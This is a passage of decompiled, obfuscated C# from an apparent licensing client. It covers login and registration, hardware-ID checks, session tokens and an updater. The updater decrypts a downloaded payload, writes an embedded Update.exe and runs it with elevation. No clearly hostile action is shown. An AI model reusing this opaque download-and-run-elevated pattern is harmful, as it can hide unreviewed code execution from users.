        (byte) 119,
        (byte) 211,
        (byte) 115,
        (byte) 254,
        (byte) 211,
        (byte) 209,
        (byte) 82,
        (byte) 131,
        (byte) 239,
        (byte) 126,
        (byte) 243,
        (byte) 119,
        (byte) 84,
        (byte) 154,
        (byte) 112,
        (byte) 65,
        (byte) 112,
        (byte) 68,
        (byte) 101,
        (byte) 93,
        (byte) 72,
        (byte) 160,
        (byte) 89,
        (byte) 210,
        (byte) 134,
        (byte) 241,
        (byte) 50,
        (byte) 69,
        (byte) 79,
        (byte) 91,
        (byte) 115,
        (byte) 60,
        (byte) 241,
        (byte) 233,
        (byte) 145,
        (byte) 123,
        (byte) 106,
        (byte) 245,
        (byte) 75,
        (byte) 120,
        (byte) 175,
        (byte) 246,
        (byte) 193,
        (byte) 108,
        (byte) 98,
        (byte) 158,
        (byte) 99,
        (byte) 74,
        (byte) 249,
        (byte) 103,
        (byte) 102,
        (byte) 194,
        (byte) 147,
        (byte) 156,
        (byte) 174,
        (byte) 214,
        (byte) 171,
        (byte) 159,
        (byte) 170,
        (byte) 225,
        (byte) 209,
        (byte) 63,
        (byte) 101,
        (byte) 198,
        (byte) 60,
        (byte) 233,
        (byte) 132,
        (byte) 105,
        (byte) 58,
        (byte) 243,
        (byte) 214,
        (byte) 122,
        (byte) 247,
        (byte) 236,
        (byte) 172,
        (byte) 81,
        (byte) 221,
        (byte) 235,
        (byte) 161,
        (byte) 230,
        (byte) 191,
        (byte) 230,
        (byte) 74,
        (byte) 230,
        (byte) 243,
        (byte) 176,
        (byte) 168,
        (byte) 134,
        (byte) 109,
        (byte) 186,
        (byte) 207,
        (byte) 201,
        (byte) 124,
        (byte) 105,
        (byte) 165,
        (byte) 162,
        (byte) 194,
        (byte) 249,
        (byte) 98,
        (byte) 120,
        (byte) 75,
        (byte) 248,
        (byte) 65,
        (byte) 55,
        (byte) 144,
        (byte) 235,
        (byte) 201,
        (byte) 166,
        (byte) 239,
        (byte) 143,
        (byte) 247,
        (byte) 190,
        (byte) 252,
        (byte) 194,
        (byte) 83,
        (byte) 234,
        (byte) 243,
        (byte) 126,
        (byte) 209,
        (byte) 138,
        (byte) 114,
        (byte) 252,
        (byte) 251,
        (byte) 127,
        (byte) 86,
        (byte) 62,
        (byte) 252,
        (byte) 192,
        (byte) 120,
        (byte) 60,
        (byte) 142,
        (byte) 227,
        (byte) 187,
        (byte) 90,
        (byte) 204,
        (byte) 198,
        (byte) 214,
        (byte) 68,
        (byte) 135,
        (byte) 58,
        (byte) 229,
        (byte) 51,
        (byte) 150,
        (byte) 221,
        (byte) 193,
        (byte) 66,
        (byte) 203,
        (byte) 184,
        (byte) 72,
        (byte) 186,
        (byte) 173,
        (byte) 117,
        (byte) 89,
        (byte) 214,
        (byte) 56,
        (byte) 77,
        (byte) 251,
        (byte) 193,
        (byte) 224,
        (byte) 132,
        (byte) 237,
        (byte) 59,
        (byte) 96,
        (byte) 228,
        (byte) 50,
        (byte) 70,
        (byte) 52,
        (byte) 211,
        (byte) 244,
        (byte) 139,
        (byte) 69,
        (byte) 224,
        (byte) 245,
        (byte) 201,
        (byte) 164,
        (byte) 113,
        (byte) 151,
        (byte) 80,
        (byte) 188,
        (byte) 69,
        (byte) 113,
        (byte) 118,
        (byte) 170,
        (byte) 188,
        (byte) 141,
        (byte) 74,
        (byte) 187,
        (byte) 228,
        (byte) 84,
        (byte) 176,
        (byte) 201,
        (byte) 71,
        (byte) 99,
        (byte) 53,
        (byte) 76,
        (byte) 220,
        (byte) 209,
        (byte) 177,
        (byte) 220,
        (byte) 173,
        (byte) 63,
        (byte) 247,
        (byte) 194,
        (byte) 187,
        (byte) 166,
        (byte) 204,
        (byte) 127,
        (byte) 143,
        (byte) 100,
        (byte) 197,
        (byte) 181,
        (byte) 221,
        (byte) 54,
        (byte) 204,
        (byte) 69,
        (byte) 169,
        (byte) 144,
        (byte) 162,
        (byte) 136,
        (byte) 231,
        (byte) 138,
        (byte) 79,
        (byte) 177,
        (byte) 118,
        (byte) 192,
        (byte) 253,
        (byte) 174,
        (byte) 241,
        (byte) 175,
        (byte) 198,
        (byte) 158,
        (byte) 229,
        (byte) 114,
        (byte) 65,
        (byte) 55,
        (byte) 121,
        (byte) 178,
        (byte) 237,
        (byte) 71,
        (byte) 192,
        (byte) 201,
        (byte) 93,
        (byte) 177,
        (byte) 142,
        (byte) 250,
        (byte) 235,
        (byte) 67,
        (byte) 150,
        (byte) 239,
        (byte) 161,
        (byte) 126,
        (byte) 97,
        (byte) 91,
        (byte) 244,
        (byte) 85,
        (byte) 239,
        (byte) 119,
        (byte) 126,
        (byte) 249,
        (byte) 168,
        (byte) 79,
        (byte) 141,
        (byte) 222,
        (byte) 156,
        (byte) 88,
        (byte) 206,
        (byte) 157,
        (byte) 243,
        (byte) 198,
        (byte) 202,
        (byte) 245,
        (byte) 161,
        (byte) 140,
        (byte) 198,
        (byte) 79,
        (byte) 94,
        (byte) 156,
        (byte) 84,
        (byte) 122,
        (byte) 212,
        (byte) 236,
        (byte) 74,
        (byte) 52,
        (byte) 63,
        (byte) 122,
        (byte) 111,
        (byte) 188,
        (byte) 125,
        (byte) 235,
        (byte) 71,
        (byte) 51,
        (byte) 102,
        (byte) 242,
        (byte) 158,
        (byte) 163,
        (byte) 110,
        (byte) 125,
        (byte) 71,
        (byte) 103,
        (byte) 94,
        (byte) 128,
        (byte) 78,
        (byte) 207,
        (byte) 86,
        (byte) 171,
        (byte) 219,
        (byte) 211,
        (byte) 147,
        (byte) 214,
        (byte) 246,
        (byte) 132,
        (byte) 84,
        (byte) 54,
        (byte) 87,
        (byte) 187,
        (byte) 54,
        (byte) 138,
        (byte) 209,
        (byte) 84,
        (byte) 232,
        (byte) 68,
        (byte) 81,
        (byte) 58,
        (byte) 176,
        (byte) 201,
        (byte) 193,
        (byte) 173,
        (byte) 237,
        (byte) 84,
        (byte) 224,
        (byte) 223,
        (byte) 135,
        (byte) 236,
        (byte) 77,
        (byte) 134,
        (byte) 208,
        (byte) 122,
        (byte) 221,
        (byte) 146,
        (byte) 158,
        (byte) 155,
        (byte) 90,
        (byte) 166,
        (byte) 244,
        (byte) 194,
        (byte) 221,
        (byte) 97,
        (byte) 205,
        (byte) 226,
        (byte) 159,
        (byte) 227,
        (byte) 171,
        (byte) 242,
        (byte) 125,
        (byte) 76,
        (byte) 96,
        (byte) 70,
        (byte) 80,
        (byte) 140,
        (byte) 233,
        (byte) 95,
        (byte) 228,
        (byte) 112,
        (byte) 244,
        (byte) 72,
        (byte) 251,
        (byte) 103,
        (byte) 231,
        (byte) 208,
        (byte) 234,
        (byte) 187,
        (byte) 172,
        (byte) 112,
        (byte) 180,
        (byte) 127,
        (byte) 232,
        (byte) 170,
        (byte) 68,
        (byte) 237,
        (byte) 234,
        (byte) 145,
        (byte) 223,
        (byte) 61,
        (byte) 180,
        (byte) 252,
        (byte) 101,
        (byte) 148,
        (byte) 160,
        (byte) 51,
        (byte) 87,
        (byte) 187,
        (byte) 91,
        (byte) 131,
        (byte) 168,
        (byte) 112,
        (byte) 181,
        (byte) 233,
        (byte) 176,
        (byte) 221,
        (byte) 197,
        (byte) 168,
        (byte) 120,
        (byte) 251,
        (byte) 247,
        (byte) 226,
        (byte) 104,
        (byte) 108,
        (byte) 111,
        (byte) 253,
        (byte) 99,
        (byte) 180,
        (byte) 51,
        (byte) 97,
        (byte) 160,
        (byte) 138,
        (byte) 127,
        (byte) 217,
        (byte) 186,
        (byte) 247,
        (byte) 225,
        (byte) 153,
        (byte) 197,
        (byte) 230,
        (byte) 170,
        (byte) 96,
        (byte) 145,
        (byte) 91,
        (byte) 199,
        (byte) 118,
        (byte) 200,
        (byte) 253,
        (byte) 249,
        (byte) 102,
        (byte) 90,
        (byte) 116,
        (byte) 74,
        (byte) 226,
        (byte) 69,
        (byte) 209,
        (byte) 197,
        (byte) 248,
        (byte) 87,
        (byte) 162,
        (byte) 207,
        (byte) 162,
        (byte) 186,
        (byte) 248,
        (byte) 225,
        (byte) 80,
        (byte) 240,
        (byte) 219,
        (byte) 96,
        (byte) 183,
        (byte) 250,
        (byte) 93,
        (byte) 225,
        (byte) 145,
        (byte) 131,
        (byte) 200,
        (byte) 130,
        (byte) 63,
        (byte) 164,
        (byte) 248,
        (byte) 102,
        (byte) 100,
        (byte) 185,
        (byte) 203,
        (byte) 57,
        (byte) 93,
        (byte) 113,
        (byte) 155,
        (byte) 197,
        (byte) 232,
        (byte) 100,
        (byte) 232,
        (byte) 116,
        (byte) 85,
        (byte) 73,
        (byte) 58,
        (byte) 164,
        (byte) 152,
        (byte) 120,
        (byte) 169,
        (byte) 132,
        (byte) 236,
        (byte) 207,
        (byte) 116,
        (byte) 106,
        (byte) 252,
        (byte) 146,
        (byte) 184,
        (byte) 145,
        (byte) 123,
        (byte) 128,
        (byte) 184,
        (byte) 134,
        (byte) 94,
        (byte) 109,
        (byte) 157,
        (byte) 231,
        (byte) 238,
        (byte) 241,
        (byte) 182,
        (byte) 221,
        (byte) 134,
        (byte) 71,
        (byte) 118,
        (byte) 133,
        (byte) 68,
        (byte) 232,
        (byte) 189,
        (byte) 122,
        (byte) 122,
        (byte) 86,
        (byte) 233,
        (byte) 197,
        (byte) 249,
        (byte) 165,
        (byte) 120,
        (byte) 147,
        (byte) 119,
        (byte) 147,
        (byte) 60,
        (byte) 201,
        (byte) 183,
        (byte) 60,
        (byte) 124,
        (byte) 153,
        (byte) 170,
        (byte) 148,
        (byte) 72,
        (byte) 231,
        (byte) 171,
        (byte) 81,
        (byte) 181,
        (byte) 165,
        (byte) 193,
        (byte) 202,
        (byte) 253,
        (byte) 214,
        (byte) 138,
        (byte) 238,
        (byte) 88,
        (byte) 69,
        (byte) 212,
        (byte) 112,
        (byte) 72,
        (byte) 86,
        (byte) 150,
        (byte) 241,
        (byte) 139,
        (byte) 183,
        (byte) 243,
        (byte) 59,
        (byte) 162,
        (byte) 140,
        (byte) 231,
        (byte) 235,
        (byte) 88,
        (byte) 124,
        (byte) 202,
        (byte) 219,
        (byte) 217,
        (byte) 174,
        (byte) 209,
        (byte) 213,
        (byte) 206,
        (byte) 91,
        (byte) 160,
        (byte) 117,
        (byte) 54,
        (byte) 97,
        (byte) 167,
        (byte) 160,
        (byte) 58,
        (byte) 135,
        (byte) 108,
        (byte) 245,
        (byte) 244,
        (byte) 121,
        (byte) 242,
        (byte) 87,
        (byte) 53,
        (byte) 184,
        (byte) 59,
        (byte) 143,
        (byte) 242,
        (byte) 161,
        (byte) 173,
        (byte) 90,
        (byte) 189,
        (byte) 212,
        (byte) 164,
        (byte) 178,
        (byte) 62,
        (byte) 173,
        (byte) 70,
        (byte) 169,
        (byte) 115,
        (byte) 254,
        (byte) 161,
        (byte) 236,
        (byte) 181,
        (byte) 82,
        (byte) 236,
        (byte) 91,
        (byte) 66,
        (byte) 132,
        (byte) 50,
        (byte) 76,
        (byte) 82,
        (byte) 240,
        (byte) 245,
        (byte) 221,
        (byte) 136,
        (byte) 164,
        (byte) 216,
        (byte) 83,
        (byte) 165,
        (byte) 116,
        (byte) 225,
        (byte) 94,
        (byte) 172,
        (byte) 120,
        (byte) 182,
        (byte) 97,
        (byte) 188,
        (byte) 243,
        (byte) 148,
        (byte) 140,
        (byte) 115,
        (byte) 194,
        (byte) 180,
        (byte) 245,
        (byte) 214,
        (byte) 56,
        (byte) 161,
        (byte) 225,
        (byte) 202,
        (byte) 222,
        (byte) 126,
        (byte) 159,
        (byte) 161,
        (byte) 147,
        (byte) 58,
        (byte) 204,
        (byte) 221,
        (byte) 197,
        (byte) 92,
        (byte) 152,
        (byte) 212,
        (byte) 242,
        (byte) 54,
        (byte) 253,
        (byte) 78,
        (byte) 116,
        (byte) 113,
        (byte) 110,
        (byte) 155,
        (byte) 189,
        (byte) 158,
        (byte) 78,
        (byte) 239,
        (byte) 165,
        (byte) 216,
        (byte) 142,
        (byte) 110,
        (byte) 50,
        (byte) 56,
        (byte) 129,
        (byte) 53,
        (byte) 245,
        (byte) 136,
        (byte) 197,
        (byte) 244,
        (byte) 115,
        (byte) 188,
        (byte) 75,
        (byte) 112,
        (byte) 233,
        (byte) 130,
        (byte) 245,
        (byte) 201,
        (byte) 250,
        (byte) 182,
        (byte) 128,
        (byte) 190,
        (byte) 181,
        (byte) 216,
        (byte) 148,
        (byte) 197,
        (byte) 100,
        (byte) 120,
        (byte) 62,
        (byte) 113,
        (byte) 98,
        (byte) 175,
        (byte) 250,
        (byte) 185,
        (byte) 170,
        (byte) 143,
        (byte) 221,
        (byte) 190,
        (byte) 217,
        (byte) 149,
        (byte) 221,
        (byte) 155,
        (byte) 111,
        (byte) 59,
        (byte) 218,
        (byte) 183,
        (byte) 88,
        (byte) 253,
        (byte) 176,
        (byte) 109,
        (byte) 168,
        (byte) 132,
        (byte) 243,
        (byte) 237,
        (byte) 138,
        (byte) 207,
        (byte) 184,
        (byte) 89,
        (byte) 163,
        (byte) 187
      };
      this.vmethod_0().byte_0 = this.byte_1;
      this.method_1();
    }
  }

  private void method_7(
    GClass33 gclass33_1,
    Class93.LicensePacket licensePacket_0,
    object[] object_0)
  {
    object[] object_3 = new object[4]
    {
      (object) this,
      (object) gclass33_1,
      (object) licensePacket_0,
      (object) object_0
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "HOQ($Pa.Q$", object_3);
  }

  private void method_8(object[] object_0)
  {
    Class93.LoginMessage loginMessage = (Class93.LoginMessage) object_0[2];
    switch (loginMessage)
    {
      case Class93.LoginMessage.Success:
        this.string_3 = (string) object_0[1];
        this.method_28();
        break;
      case Class93.LoginMessage.IncorrectUsernameOrPassword:
        this.method_34();
        this.method_30(this.method_32(System.Enum.GetName(typeof (Class93.LoginMessage), (object) loginMessage)), "1500", "error");
        break;
      case Class93.LoginMessage.YourHardwareIdHasBeenChangedPleaseCreateASupportTicket:
        this.method_34();
        this.method_30(this.method_32(System.Enum.GetName(typeof (Class93.LoginMessage), (object) loginMessage)), "3000", "error");
        break;
      case Class93.LoginMessage.LicenseBannedFor:
        this.method_34();
        this.method_30(this.method_32(System.Enum.GetName(typeof (Class93.LoginMessage), (object) loginMessage)) + ":  " + (string) object_0[3], "5000", "error");
        break;
    }
  }

  private void method_9()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "NoZ@ePa.Q$", object_3);
  }

  private void method_10()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), ")]=g&Pa.Q$", object_3);
  }

  private void method_11(string string_6)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) string_6
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "$\\OV+Pa.Q$", object_3);
  }

  private void method_12(object[] object_0)
  {
    Class93.RegisterMessage registerMessage = (Class93.RegisterMessage) object_0[1];
    if (registerMessage == Class93.RegisterMessage.RegistrationSuccessYouCanNowLogIn)
      this.method_30(this.method_32(System.Enum.GetName(typeof (Class93.RegisterMessage), (object) registerMessage)), "3000", "success");
    else
      this.method_30(this.method_32(System.Enum.GetName(typeof (Class93.RegisterMessage), (object) registerMessage)), "3000", "error");
    this.method_33();
  }

  private void method_13(object[] object_0)
  {
    switch ((Class93.UpdatePacket) object_0[1])
    {
      case Class93.UpdatePacket.NoUpdateRequired:
        this.method_9();
        break;
      case Class93.UpdatePacket.Update:
        this.method_14((string) object_0[2], (byte[]) object_0[3]);
        this.gclass35_0.method_12();
        break;
    }
  }

  private void method_14(string string_6, byte[] byte_2)
  {
    object[] object_3 = new object[3]
    {
      (object) this,
      (object) string_6,
      (object) byte_2
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "\"M'\\ZPa.Q$", object_3);
  }

  private void method_15(object sender, DownloadDataCompletedEventArgs e)
  {
    try
    {
      byte[] result = e.Result;
      string path = Path.GetTempPath() + "\\" + Class97.smethod_31(Conversions.ToString(Class97.smethod_30())) + ".zip";
      byte[] bytes = Load.Decompress(dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_0(result, this.byte_0), 0U);
      System.IO.File.WriteAllBytes("Update.exe", Load.Decompress(Convert.FromBase64String(Class145.smethod_70()), 0U));
      System.IO.File.WriteAllBytes(path, bytes);
      this.gclass35_0.method_14("Download Complete... " + path);
      this.gclass35_0.method_14("Extracting update to installation directory");
      this.gclass35_0.method_13(100, (double) bytes.Length / 1024.0 / 1024.0, (double) bytes.Length / 1024.0 / 1024.0);
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = Application.StartupPath + "\\Update.exe",
          Arguments = "\"" + path + "\""
        }
      };
      process.StartInfo.Verb = "runas";
      process.Start();
      Class93.formLogin_0.method_6();
      Class93.formLogin_0.DialogResult = DialogResult.Cancel;
      Class93.formLogin_0.bool_0 = true;
      Process.GetCurrentProcess().Kill();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class93.formLogin_0.bool_0 = true;
      Class93.formLogin_0.Close();
      ProjectData.ClearProjectError();
    }
  }

  private void method_16(object sender, DownloadProgressChangedEventArgs e)
  {
    if (!this.bool_1)
    {
      this.gclass35_0.method_14("Downloading update from: " + this.string_2);
      this.bool_1 = true;
    }
    long num1 = e.BytesReceived;
    double num2 = double.Parse(num1.ToString());
    num1 = e.TotalBytesToReceive;
    double num3 = double.Parse(num1.ToString());
    this.gclass35_0.method_13((int) Math.Round(Math.Truncate(num2 / num3 * 100.0)), num2 / 1024.0 / 1024.0, num3 / 1024.0 / 1024.0);
  }

  private void method_17(object[] object_0)
  {
    switch ((Class93.SessionPacket) object_0[1])
    {
      case Class93.SessionPacket.Key:
        this.string_5 = (string) object_0[2];
        System.IO.File.WriteAllText(this.string_1, this.string_5);
        break;
      case Class93.SessionPacket.ValidLogin:
        this.string_3 = (string) object_0[2];
        this.method_28();
        break;
      case Class93.SessionPacket.ValidRefresh:
        Class97.gclass2_0.method_0("[Licensing] Session validated!", Class97.gclass2_0.textStyle_1);
        break;
      case Class93.SessionPacket.InvalidRefresh:
        if (Class97.formMain_0 == null)
          break;
        int num;
        Class97.formMain_0.Invoke((Delegate) (() => num = (int) MessageBox.Show("Session Lost, please restart", "Session lost", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)));
        Class97.formMain_0.Invoke((Delegate) (() => Class97.formMain_0.method_15()));
        break;
    }
  }

  private void method_18()
  {
    object[] object_3 = new object[1]{ (object) this };
    Class86.smethod_0().method_68(Class86.smethod_1(), "b5d]hPa.Q$", object_3);
  }

  private void method_19(string string_6, string string_7)
  {
    GClass1.Class87 class87 = new GClass1.Class87();
    class87.string_1 = string_6;
    class87.string_0 = string_7;
    if (Class97.formMain_0 == null)
      return;
    Class97.formMain_0.Invoke((Delegate) new Delegate0(class87._Lambda\u0024__143));
  }

  private void method_20(object[] object_0)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) object_0
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "CH.K@Pa.Q$", object_3);
  }

  private void method_21(byte[] byte_2)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) byte_2
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "kGXQ-Pa.Q$", object_3);
  }

  public void method_22()
  {
    if (!System.IO.File.Exists(this.string_1))
      return;
    string Left = string.Empty;
    try
    {
      Left = System.IO.File.ReadAllText(this.string_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Operators.CompareString(Left, string.Empty, false) == 0)
      return;
    this.method_3(this.vmethod_0(), new object[4]
    {
      (object) Class93.LicensePacket.Session,
      (object) Class93.SessionPacket.Login,
      (object) Left,
      (object) this.method_35()
    });
  }

  private void method_23(GClass33 gclass33_1)
  {
    if (!System.IO.File.Exists(this.string_1))
      return;
    string Left = string.Empty;
    try
    {
      Left = System.IO.File.ReadAllText(this.string_1);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    if (Operators.CompareString(Left, string.Empty, false) == 0)
      return;
    this.method_3(gclass33_1, new object[4]
    {
      (object) Class93.LicensePacket.Session,
      (object) Class93.SessionPacket.Refresh,
      (object) Left,
      (object) this.method_35()
    });
  }

  private void method_24(string string_6)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) string_6
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "%#pF6Pa.Q$", object_3);
  }

  public object method_25(string string_6)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) string_6
    };
    return Class86.smethod_0().method_270(Class86.smethod_1(), "XfmnOPa.Q$", object_3);
  }

  public void method_26(string string_6, string string_7)
  {
    object[] object_3 = new object[3]
    {
      (object) this,
      (object) string_6,
      (object) string_7
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "Una*:Pa.Q$", object_3);
  }

  public void method_27(RegistrationDetails registrationDetails_0)
  {
    object[] object_3 = new object[2]
    {
      (object) this,
      (object) registrationDetails_0
    };
    Class86.smethod_0().method_68(Class86.smethod_1(), "4joLWPa.Q$", object_3);
  }

  private void method_28() => this.method_3(this.vmethod_0(), new object[3]
  {
    (object) Class93.LicensePacket.Update,
    (object) Class93.UpdatePacket.NoUpdateRequired,
    (object) FileVersionInfo.GetVersionInfo(Application.ExecutablePath).FileVersion
  });

  public void method_29(string string_6, string string_7) => this.method_3(this.vmethod_0(), new object[3]
  {
    (object) Class93.LicensePacket.ErrorMessage,
    (object) string_6,
    (object) string_7
  });

  private void method_30(string string_6, string string_7, string string_8) => Class93.formLogin_0.Invoke((Delegate) new Delegate0(new GClass1.Class88()
  {
    string_0 = "toastr." + string_8 + "('" + string_6 + "', undefined, {timeOut: " + string_7 + ", positionClass: 'toast-bottom-center'} )"
  }._Lambda\u0024__145));

  private string method_31(string string_6)
  {
    char[] charArray = string_6.ToCharArray();
    Array.Reverse((Array) charArray);
    return new string(charArray);
  }

  private string method_32(string string_6)
  {
    string str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    int startIndex = 0;
    do
    {
      string_6 = string_6.Replace(str.Substring(startIndex, 1), " " + str.Substring(startIndex, 1));
      ++startIndex;
    }
    while (startIndex <= 25);
    return Strings.Trim(string_6);
  }

  private void method_33()
  {
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#registerButton').show();")));
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#loginLink').show();")));
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#preloader').hide();")));
    this.vmethod_0().int_6 = 0;
  }

  private void method_34()
  {
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#loginButton').show();")));
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#register').show();")));
    Class93.formLogin_0.Invoke((Delegate) (() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), "$('#preloader').hide();")));
    this.vmethod_0().int_6 = 0;
  }

  public string method_35()
  {
    object[] object_3 = new object[1]{ (object) this };
    return (string) Class86.smethod_0().method_270(Class86.smethod_1(), "SDB?lPa.Q$", object_3);
  }

  private string method_36()
  {
    string str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    StringBuilder stringBuilder = new StringBuilder();
    int num = 1;
    do
    {
      int startIndex = this.random_0.Next(0, 35);
      stringBuilder.Append(str, startIndex, 1);
      ++num;
    }
    while (num <= 16);
    return stringBuilder.ToString();
  }

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern bool GetVolumeInformationA(
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_6,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_7,
    uint uint_0,
    ref uint uint_1,
    ref uint uint_2,
    ref uint uint_3,
    [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_8,
    uint uint_4);

  internal sealed class Class87
  {
    public string string_0;
    public string string_1;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__143()
    {
      FormUpdateNotification updateNotification = new FormUpdateNotification(this.string_1, this.string_0);
      updateNotification.TopMost = true;
      int num = (int) updateNotification.ShowDialog();
    }
  }

  internal sealed class Class88
  {
    public string string_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__145() => Class97.smethod_20(Class93.formLogin_0.vmethod_2(), this.string_0);
  }

  internal sealed class Class89
  {
    public object[] object_0;
    public GClass1 gclass1_0;

    [CompilerGenerated]
    [SpecialName]
    public void _Lambda\u0024__140() => this.gclass1_0.method_13(this.object_0);
  }
}
